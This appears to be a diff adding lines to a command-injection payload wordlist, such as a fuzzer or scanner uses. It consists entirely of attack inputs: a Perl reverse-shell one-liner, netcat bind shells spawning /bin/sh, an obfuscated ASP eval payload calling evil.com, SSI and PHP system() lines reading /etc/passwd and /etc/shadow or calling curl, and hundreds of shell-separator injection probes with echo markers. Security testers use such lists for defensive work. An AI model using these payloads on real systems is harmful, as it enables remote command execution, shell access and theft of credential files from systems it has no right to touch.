+; echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+| echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">;S");open(STDOUT,">;S");open(STDERR,">;S");exec("/bin/sh -i");};" > rev.pl
+echo "use Socket;$i="127.0.0.1";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};" > rev.pl
+"&&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+"&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+";echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+"||echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+"|echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+"echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+&&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+'&&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+'&echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+';echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+'||echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+'|echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+'echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+;echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+||echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+|echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+echo ZBTJIZ$((28+56))$(echo ZBTJIZ)ZBTJIZ|
+"&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+"&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+";echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+"||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+"|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+"echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'&&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'&echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+';echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+'echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+;echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+||echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+|echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+echo ZFETQZ$((73+0))$(echo ZFETQZ)ZFETQZ\\
+"&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+"&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+";echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+"||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+"|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+"echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'&&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'&echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+';echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+'echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+;echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+||echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+|echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+echo ZJGMJR$((29+4))$(echo ZJGMJR)ZJGMJR//
+"&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+"&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+";echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+"||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+"|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+"echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'&&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'&echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+';echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+'echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+;echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+||echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+|echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+echo ZOHJGD$((19+47))$(echo ZOHJGD)ZOHJGD'
+"&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+"&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+";echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+"||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+"|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+"echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'&&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'&echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+';echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+'echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+;echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+||echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+|echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+echo ZUCAWY$((35+43))$(echo ZUCAWY)ZUCAWY&
+"&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+"&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+";echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+"||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+"|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+"echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'&&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'&echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+';echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+'echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+;echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+||echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+|echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+echo ZZKJNZ$((11+6))$(echo ZZKJNZ)ZZKJNZ
+Ev al ("Ex"&"e"&"cute(""Server.ScriptTimeout=3600:On Error Resume Next:Function bd(byVal s):For i=1 To Len(s) Step 2:c=M"&"i"&"d(s,i,2):If IsNumeric(M"&"i"&"d(s,i,1)) Then:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&"""")""""):Else:Ex"&"e"&"cute(""""bd=bd&c"&"h"&"r(&H""""&c&M"&"i"&"d(s,i 2,2)&"""")""""):i=i 2:End If""&c"&"h"&"r(10)&""Next:End Function:Response.Write(""""@*lxl*@""""):Ex"&"e"&"cute(""""On Error Resume Next:""""&bd(""""44696d20686d3a536574206f626a584d4c3d5365727665722e4372656174654f626a65637428224d53584d4c322e536572766572584d4c4854545022293a6f626a584d4c2e6f70656e2022474554222c22687474703a2f2f6576696c2e636f6d2f6170692e7068703f6b65793d7c786c736c31736b733832646a6173647564736178787878222c66616c73653a6f626a584d4c2e73656e6428293a686d3d6f626a584d4c2e726573706f6e7365546578743a496620686d3c3e224f4b22205468656e3a526573706f6e73652e57726974652822454e4422293a456e642049663a526573706f6e73652e577269746528224c584c2229"""")):Response.Write(""""*@lxl@*""""):Response.End"")")
+eval('ls')
+eval('pwd')
+eval('pwd');
+eval('sleep 5')
+eval('sleep 5');
+eval('whoami')
+eval('whoami');
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+exec('ls')
+exec('pwd')
+exec('pwd');
+exec('sleep 5')
+exec('sleep 5');
+exec('whoami')
+exec('whoami');
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{ get_user_file("/etc/passwd") }}
+& id
+&&id
+; id
+;id
+;id;
+;id|
+`id`
+| id
+|id
+|id;
+|id|
+;id\n
+& ifconfig
+&& ifconfig
+; ifconfig
+| ifconfig
+ifconfig
+ipconfig
+& ipconfig /all
+&& ipconfig /all
+; ipconfig /all
+| ipconfig /all
+ipconfig /all
+& ls -l /
+&& ls -l /
+; ls -l /
+| ls -l /
+ls -l /
+& ls -laR /etc
+&& ls -laR /etc
+; ls -laR /etc
+| ls -laR /etc
+& ls -laR /var/www
+&& ls -laR /var/www
+; ls -laR /var/www
+| ls -laR /var/www
+& ls -l /etc/
+&& ls -l /etc/
+; ls -l /etc/
+| ls -l /etc/
+ls -l /etc/
+ls -lh /etc/
+& ls -l /home/*
+&& ls -l /home/*
+; ls -l /home/*
+| ls -l /home/*
+ls -l /home/*
+*; ls -lhtR /var/www/
+& ls -l /tmp
+&& ls -l /tmp
+; ls -l /tmp
+| ls -l /tmp
+ls -l /tmp
+& ls -l /var/www/*
+&& ls -l /var/www/*
+; ls -l /var/www/*
+| ls -l /var/www/*
+ls -l /var/www/*
+\n/bin/ls -al\n
+& nc -lvvp 4444 -e /bin/sh&
+&& nc -lvvp 4444 -e /bin/sh &
+; nc -lvvp 4444 -e /bin/sh;
+| nc -lvvp 4444 -e /bin/sh|
+nc -lvvp 4444 -e /bin/sh
+nc -lvvp 4445 -e /bin/sh &
+nc -lvvp 4446 -e /bin/sh|
+nc -lvvp 4447 -e /bin/sh;
+nc -lvvp 4448 -e /bin/sh&
+;netstat -a;
+& netstat -an
+&& netstat -an
+; netstat -an
+| netstat -an
+netstat -an
+& net view
+&& net view
+; net view
+| net view
+\nid;
+\nid|
+\nid\n
+|nid\n
+\n/usr/bin/id;
+\n/usr/bin/id|
+\n/usr/bin/id\n
+& phpinfo()
+&& phpinfo()
+';phpinfo();//
+;phpinfo()
+;phpinfo();//
+| phpinfo()
+|| phpinfo()
+phpinfo();
+<?php system("cat /etc/passwd");?>
+<?php system("curl https://fake.domain/rce_vuln.txt?req=df2fkjj");?>
+<?php system("sleep 10");?>
+:phpversion();
+||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+& ping -i 30 127.0.0.1 &
+".print(`echo ACGJLG%0aecho $((54+11))%0aecho ACGJLG%0aecho ACGJLG`);%255C%255CACGJLG
+")print(`echo ADFEOJ%0aecho $((67+57))%0aecho ADFEOJ%0aecho ADFEOJ`);.%2527ADFEOJ
+'print(`echo ADRNCB;echo $((35+33));echo ADRNCB;echo ADRNCB`);.'ADRNCB
+print(`echo ADZJNM`.`echo $((71+71))`.`echo ADZJNM`.`echo ADZJNM`);\\ADZJNM
+)print(`echo AFOMNK%0aecho $((45+23))%0aecho AFOMNK%0aecho AFOMNK`);%2529%257DAFOMNK
+')print(`echo AGBHMS%0aecho $((79+32))%0aecho AGBHMS%0aecho AGBHMS`);%2529%257DAGBHMS
+".print(`echo AGODDO%0aecho $((7+33))%0aecho AGODDO%0aecho AGODDO`);AGODDO
+'print(`echo AHOHOK%0aecho $((14+28))%0aecho AHOHOK%0aecho AHOHOK`);AHOHOK
+'print(`echo ANYJLP`.`echo $((86+96))`.`echo ANYJLP`.`echo ANYJLP`);.'ANYJLP
+)print(`echo ASMFMR\necho $((34+56))\necho ASMFMR\necho ASMFMR`);%252523ASMFMR
+")print(`echo ATRPAE;echo $((77+72));echo ATRPAE;echo ATRPAE`);\\ATRPAE
+'print(`echo AWHBQS\necho $((81+11))\necho AWHBQS\necho AWHBQS`);%252529%25257DAWHBQS
+'print(`echo AYKYLG%0aecho $((60+1))%0aecho AYKYLG%0aecho AYKYLG`);.%2527AYKYLG
+);}print(`echo BAPQUZ;echo $((9+46));echo BAPQUZ;echo BAPQUZ`);//BAPQUZ
+print(`echo BAYPKT`.`echo $((43+10))`.`echo BAYPKT`.`echo BAYPKT`);BAYPKT
+);}print(`echo BCMROJ;echo $((2+69));echo BCMROJ;echo BCMROJ`);.'BCMROJ
+'print(`echo BFUQZN%0aecho $((42+76))%0aecho BFUQZN%0aecho BFUQZN`);%2529%257DBFUQZN
+');}print(`echo BHUVJI\necho $((10+13))\necho BHUVJI\necho BHUVJI`);BHUVJI
+);}print(`echo BJFECX;echo $((21+86));echo BJFECX;echo BJFECX`);#BJFECX
+')print(`echo BONGAS;echo $((69+7));echo BONGAS;echo BONGAS`);\\BONGAS
+');}print(`echo BQJSKG;echo $((72+76));echo BQJSKG;echo BQJSKG`);#BQJSKG
+print(`echo BQVIXY\necho $((53+95))\necho BQVIXY\necho BQVIXY`);%252529%25257DBQVIXY
+'print(`echo BRTYSY\necho $((74+40))\necho BRTYSY\necho BRTYSY`);BRTYSY
+")print(`echo BUJJSS\necho $((4+1))\necho BUJJSS\necho BUJJSS`);%252529%25257DBUJJSS
+')print(`echo BWPFXW%0aecho $((76+34))%0aecho BWPFXW%0aecho BWPFXW`);BWPFXW
+")print(`echo CAQHUJ;echo $((70+24));echo CAQHUJ;echo CAQHUJ`);.'CAQHUJ
+".print(`echo CEZYFB\necho $((70+98))\necho CEZYFB\necho CEZYFB`);.%252522CEZYFB
+")print(`echo CHKGSS`.`echo $((80+0))`.`echo CHKGSS`.`echo CHKGSS`);#CHKGSS
+");}print(`echo CKSIUK\necho $((45+4))\necho CKSIUK\necho CKSIUK`);%252523CKSIUK
+print(`echo COMCFL\necho $((84+79))\necho COMCFL\necho COMCFL`);COMCFL
+")print(`echo COMPTT`.`echo $((78+29))`.`echo COMPTT`.`echo COMPTT`);COMPTT
+")print(`echo COYGWQ;echo $((40+21));echo COYGWQ;echo COYGWQ`);)}COYGWQ
+".print(`echo COYIQB`.`echo $((70+26))`.`echo COYIQB`.`echo COYIQB`);COYIQB
+'print(`echo CRERAD;echo $((48+33));echo CRERAD;echo CRERAD`);//CRERAD
+'print(`echo CVFEYY\necho $((56+86))\necho CVFEYY\necho CVFEYY`);//CVFEYY
+'.print(`echo CXYKAU\necho $((56+15))\necho CXYKAU\necho CXYKAU`);//CXYKAU
+print(`echo DAESAZ\necho $((6+17))\necho DAESAZ\necho DAESAZ`);%25255C%25255CDAESAZ
+print(`echo DBCNNO%0aecho $((39+97))%0aecho DBCNNO%0aecho DBCNNO`);.%2522DBCNNO
+".print(`echo DBTAFQ\necho $((79+27))\necho DBTAFQ\necho DBTAFQ`);.%252527DBTAFQ
+print(`echo DEGOPG;echo $((38+61));echo DEGOPG;echo DEGOPG`);\\DEGOPG
+);}print(`echo DETLEF`.`echo $((0+62))`.`echo DETLEF`.`echo DETLEF`);."DETLEF
+');}print(`echo DEXNOX\necho $((69+36))\necho DEXNOX\necho DEXNOX`);%252529%25257DDEXNOX
+".print(`echo DFRGXJ`.`echo $((12+99))`.`echo DFRGXJ`.`echo DFRGXJ`);."DFRGXJ
+");}print(`echo DKLYZK;echo $((5+95));echo DKLYZK;echo DKLYZK`);#DKLYZK
+)print(`echo DLBCJS;echo $((58+85));echo DLBCJS;echo DLBCJS`);\\DLBCJS
+)print(`echo DPBGWU%0aecho $((48+67))%0aecho DPBGWU%0aecho DPBGWU`);.%2522DPBGWU
+'print(`echo DQLEND`.`echo $((63+84))`.`echo DQLEND`.`echo DQLEND`);\\DQLEND
+);}print(`echo DSHIRJ\necho $((54+41))\necho DSHIRJ\necho DSHIRJ`);.%252522DSHIRJ
+".print(`echo DSHOEV%0aecho $((44+47))%0aecho DSHOEV%0aecho DSHOEV`);%2523DSHOEV
+'print(`echo DUAYMM`.`echo $((77+73))`.`echo DUAYMM`.`echo DUAYMM`);DUAYMM
+')print(`echo DWTUTD%0aecho $((10+15))%0aecho DWTUTD%0aecho DWTUTD`);//DWTUTD
+'.print(`echo DWVXEQ;echo $((13+19));echo DWVXEQ;echo DWVXEQ`);#DWVXEQ
+print(`echo DWYWNU;echo $((31+36));echo DWYWNU;echo DWYWNU`);DWYWNU
+print(`echo DYZZIW;echo $((94+81));echo DYZZIW;echo DYZZIW`);#DYZZIW
+)print(`echo ECXTUU;echo $((10+67));echo ECXTUU;echo ECXTUU`);#ECXTUU
+)print(`echo EHMRQP`.`echo $((92+22))`.`echo EHMRQP`.`echo EHMRQP`);#EHMRQP
+')print(`echo EHPKWP\necho $((79+86))\necho EHPKWP\necho EHPKWP`);//EHPKWP
+')print(`echo EHVUCK;echo $((3+47));echo EHVUCK;echo EHVUCK`);.'EHVUCK
+print(`echo EIPAAC\necho $((42+82))\necho EIPAAC\necho EIPAAC`);%252523EIPAAC
+".print(`echo EKDSZM;echo $((50+62));echo EKDSZM;echo EKDSZM`);."EKDSZM
+');}print(`echo EKPEWV%0aecho $((50+69))%0aecho EKPEWV%0aecho EKPEWV`);EKPEWV
+')print(`echo ESWACN;echo $((37+82));echo ESWACN;echo ESWACN`);ESWACN
+print(`echo ETZHWZ\necho $((20+88))\necho ETZHWZ\necho ETZHWZ`);//ETZHWZ
+');}print(`echo EVHTLK\necho $((99+40))\necho EVHTLK\necho EVHTLK`);//EVHTLK
+)print(`echo EVRVDK\necho $((98+18))\necho EVRVDK\necho EVRVDK`);%252529%25257DEVRVDK
+')print(`echo EVXXCT;echo $((87+15));echo EVXXCT;echo EVXXCT`);."EVXXCT
+'.print(`echo EVZCEK%0aecho $((38+37))%0aecho EVZCEK%0aecho EVZCEK`);%255C%255CEVZCEK
+')print(`echo EXVUXJ\necho $((73+54))\necho EXVUXJ\necho EXVUXJ`);EXVUXJ
+".print(`echo EYOYIJ;echo $((34+58));echo EYOYIJ;echo EYOYIJ`);//EYOYIJ
+)print(`echo EZVLWV\necho $((40+27))\necho EZVLWV\necho EZVLWV`);.%252527EZVLWV
+')print(`echo FCMKMZ;echo $((68+75));echo FCMKMZ;echo FCMKMZ`);//FCMKMZ
+)print(`echo FGPZFR%0aecho $((7+1))%0aecho FGPZFR%0aecho FGPZFR`);.%2527FGPZFR
+');}print(`echo FOGQPM\necho $((27+12))\necho FOGQPM\necho FOGQPM`);%25255C%25255CFOGQPM
+'print(`echo FQEMGW%0aecho $((58+2))%0aecho FQEMGW%0aecho FQEMGW`);.%2522FQEMGW
+'.print(`echo GDFQZF;echo $((65+2));echo GDFQZF;echo GDFQZF`);//GDFQZF
+print(`echo GDOHGQ\necho $((28+89))\necho GDOHGQ\necho GDOHGQ`);.%252522GDOHGQ
+print(`echo GENLGI`.`echo $((14+11))`.`echo GENLGI`.`echo GENLGI`);#GENLGI
+)print(`echo GGCMZV`.`echo $((6+53))`.`echo GGCMZV`.`echo GGCMZV`))}GGCMZV
+'print(`echo GGTKKU`.`echo $((23+93))`.`echo GGTKKU`.`echo GGTKKU`);//GGTKKU
+")print(`echo GHHJFR%0aecho $((52+63))%0aecho GHHJFR%0aecho GHHJFR`);%255C%255CGHHJFR
+");}print(`echo GHISCR\necho $((96+53))\necho GHISCR\necho GHISCR`);.%252522GHISCR
+")print(`echo GIKPYM\necho $((77+22))\necho GIKPYM\necho GIKPYM`);.%252527GIKPYM
+');}print(`echo GKLRKU%0aecho $((97+77))%0aecho GKLRKU%0aecho GKLRKU`);.%2522GKLRKU
+'print(`echo GSORDT;echo $((68+29));echo GSORDT;echo GSORDT`);#GSORDT
+');}print(`echo GVZZMK;echo $((1+62));echo GVZZMK;echo GVZZMK`);//GVZZMK
+".print(`echo HAMONB`.`echo $((26+57))`.`echo HAMONB`.`echo HAMONB`);.'HAMONB
+'.print(`echo HBLPLA%0aecho $((39+88))%0aecho HBLPLA%0aecho HBLPLA`);.%2522HBLPLA
+');}print(`echo HDQYRP`.`echo $((43+86))`.`echo HDQYRP`.`echo HDQYRP`);."HDQYRP
+');}print(`echo HDWSHN%0aecho $((40+78))%0aecho HDWSHN%0aecho HDWSHN`);%255C%255CHDWSHN
+');}print(`echo HEGGJN`.`echo $((68+69))`.`echo HEGGJN`.`echo HEGGJN`);.'HEGGJN
+".print(`echo HGIQEK;echo $((64+67));echo HGIQEK;echo HGIQEK`);)}HGIQEK
+print(`echo HHRISK\necho $((73+42))\necho HHRISK\necho HHRISK`);.%252527HHRISK
+'.print(`echo HLTCMZ`.`echo $((55+5))`.`echo HLTCMZ`.`echo HLTCMZ`))}HLTCMZ
+)print(`echo HQNHAD%0aecho $((91+64))%0aecho HQNHAD%0aecho HQNHAD`);HQNHAD
+");}print(`echo HWAGVJ%0aecho $((14+22))%0aecho HWAGVJ%0aecho HWAGVJ`);%255C%255CHWAGVJ
+")print(`echo HXHMHH;echo $((40+31));echo HXHMHH;echo HXHMHH`);//HXHMHH
+);}print(`echo HXJYZZ%0aecho $((70+79))%0aecho HXJYZZ%0aecho HXJYZZ`);.%2522HXJYZZ
+)print(`echo HXXRRP`.`echo $((98+1))`.`echo HXXRRP`.`echo HXXRRP`);."HXXRRP
+");}print(`echo IBFQKH;echo $((32+31));echo IBFQKH;echo IBFQKH`);."IBFQKH
+)print(`echo IFOQRT;echo $((35+23));echo IFOQRT;echo IFOQRT`);//IFOQRT
+".print(`echo IFQMUW\necho $((62+32))\necho IFQMUW\necho IFQMUW`);IFQMUW
+');}print(`echo IFVTUZ\necho $((51+31))\necho IFVTUZ\necho IFVTUZ`);.%252527IFVTUZ
+'.print(`echo IINFPE\necho $((95+84))\necho IINFPE\necho IINFPE`);.%252527IINFPE
+');}print(`echo IMZVGR%0aecho $((80+38))%0aecho IMZVGR%0aecho IMZVGR`);%2523IMZVGR
+'.print(`echo IQVVVA`.`echo $((38+34))`.`echo IQVVVA`.`echo IQVVVA`);IQVVVA
+');}print(`echo IXTNVY%0aecho $((8+16))%0aecho IXTNVY%0aecho IXTNVY`);%2529%257DIXTNVY
+'.print(`echo IYCMIH\necho $((35+93))\necho IYCMIH\necho IYCMIH`);%252523IYCMIH
+');}print(`echo JDHUOY;echo $((0+32));echo JDHUOY;echo JDHUOY`);."JDHUOY
+");}print(`echo JFBZLZ%0aecho $((64+83))%0aecho JFBZLZ%0aecho JFBZLZ`);//JFBZLZ
+);}print(`echo JIIHYT;echo $((7+65));echo JIIHYT;echo JIIHYT`);)}JIIHYT
+'print(`echo JIKWPW\necho $((92+0))\necho JIKWPW\necho JIKWPW`);.%252527JIKWPW
+'.print(`echo JLXMKL\necho $((67+26))\necho JLXMKL\necho JLXMKL`);.%252522JLXMKL
+")print(`echo JNKGOO\necho $((17+90))\necho JNKGOO\necho JNKGOO`);.%252522JNKGOO
+);}print(`echo JRCPDX;echo $((59+49));echo JRCPDX;echo JRCPDX`);\\JRCPDX
+);}print(`echo JRFJOE%0aecho $((92+73))%0aecho JRFJOE%0aecho JRFJOE`);%2523JRFJOE
+')print(`echo JUEAPR%0aecho $((30+6))%0aecho JUEAPR%0aecho JUEAPR`);.%2522JUEAPR
+);}print(`echo KAJDYV%0aecho $((71+88))%0aecho KAJDYV%0aecho KAJDYV`);KAJDYV
+);}print(`echo KAYVRD\necho $((4+54))\necho KAYVRD\necho KAYVRD`);%252529%25257DKAYVRD
+);}print(`echo KBRMCR\necho $((41+94))\necho KBRMCR\necho KBRMCR`);.%252527KBRMCR
+);}print(`echo KDYDKK\necho $((47+87))\necho KDYDKK\necho KDYDKK`);//KDYDKK
+'.print(`echo KFTIEO\necho $((9+66))\necho KFTIEO\necho KFTIEO`);%252529%25257DKFTIEO
+'.print(`echo KHHFWC;echo $((15+27));echo KHHFWC;echo KHHFWC`);KHHFWC
+");}print(`echo KHRTRY`.`echo $((68+68))`.`echo KHRTRY`.`echo KHRTRY`);//KHRTRY
+'.print(`echo KKDSRH`.`echo $((88+16))`.`echo KKDSRH`.`echo KKDSRH`);\\KKDSRH
+'print(`echo KKQSRA`.`echo $((71+76))`.`echo KKQSRA`.`echo KKQSRA`);#KKQSRA
+)print(`echo KPLWCF\necho $((96+6))\necho KPLWCF\necho KPLWCF`);//KPLWCF
+);}print(`echo KRAWWO`.`echo $((15+36))`.`echo KRAWWO`.`echo KRAWWO`);\\KRAWWO
+'.print(`echo KVAVOQ`.`echo $((63+81))`.`echo KVAVOQ`.`echo KVAVOQ`);//KVAVOQ
+);}print(`echo KXLAQH`.`echo $((80+88))`.`echo KXLAQH`.`echo KXLAQH`);.'KXLAQH
+);}print(`echo KYGLOF`.`echo $((80+87))`.`echo KYGLOF`.`echo KYGLOF`))}KYGLOF
+')print(`echo KYHRZA`.`echo $((72+0))`.`echo KYHRZA`.`echo KYHRZA`);KYHRZA
+")print(`echo KZZFJE;echo $((74+13));echo KZZFJE;echo KZZFJE`);#KZZFJE
+print(`echo LPXWJK;echo $((35+1));echo LPXWJK;echo LPXWJK`);//LPXWJK
+");}print(`echo LVFGXD`.`echo $((25+23))`.`echo LVFGXD`.`echo LVFGXD`);."LVFGXD
+)print(`echo LXAMNA%0aecho $((68+25))%0aecho LXAMNA%0aecho LXAMNA`);%2523LXAMNA
+)print(`echo MADCWE\necho $((88+74))\necho MADCWE\necho MADCWE`);MADCWE
+')print(`echo MAOJQM\necho $((57+39))\necho MAOJQM\necho MAOJQM`);%252523MAOJQM
+");}print(`echo MDITEG;echo $((51+68));echo MDITEG;echo MDITEG`);.'MDITEG
+'.print(`echo MFBKHT%0aecho $((27+47))%0aecho MFBKHT%0aecho MFBKHT`);.%2527MFBKHT
+'.print(`echo MFFGYS;echo $((68+25));echo MFFGYS;echo MFFGYS`);."MFFGYS
+".print(`echo MFYSPW;echo $((87+75));echo MFYSPW;echo MFYSPW`);#MFYSPW
+".print(`echo MGGIBH\necho $((69+4))\necho MGGIBH\necho MGGIBH`);%252529%25257DMGGIBH
+".print(`echo MKBEZC\necho $((61+47))\necho MKBEZC\necho MKBEZC`);//MKBEZC
+'print(`echo MKGGZP`.`echo $((69+92))`.`echo MKGGZP`.`echo MKGGZP`);."MKGGZP
+'print(`echo MLMZKH`.`echo $((30+25))`.`echo MLMZKH`.`echo MLMZKH`))}MLMZKH
+")print(`echo MMOCRN%0aecho $((88+99))%0aecho MMOCRN%0aecho MMOCRN`);%2529%257DMMOCRN
+');}print(`echo MMQDEE\necho $((77+28))\necho MMQDEE\necho MMQDEE`);%252523MMQDEE
+")print(`echo MOHYBU`.`echo $((61+5))`.`echo MOHYBU`.`echo MOHYBU`);\\MOHYBU
+");}print(`echo MPXDZZ%0aecho $((78+91))%0aecho MPXDZZ%0aecho MPXDZZ`);.%2522MPXDZZ
+);}print(`echo MRPUDM`.`echo $((50+14))`.`echo MRPUDM`.`echo MRPUDM`);#MRPUDM
+);}print(`echo MSEKQO;echo $((87+12));echo MSEKQO;echo MSEKQO`);."MSEKQO
+);}print(`echo MUNABZ`.`echo $((46+73))`.`echo MUNABZ`.`echo MUNABZ`);//MUNABZ
+'print(`echo MURMGO%0aecho $((13+87))%0aecho MURMGO%0aecho MURMGO`);%255C%255CMURMGO
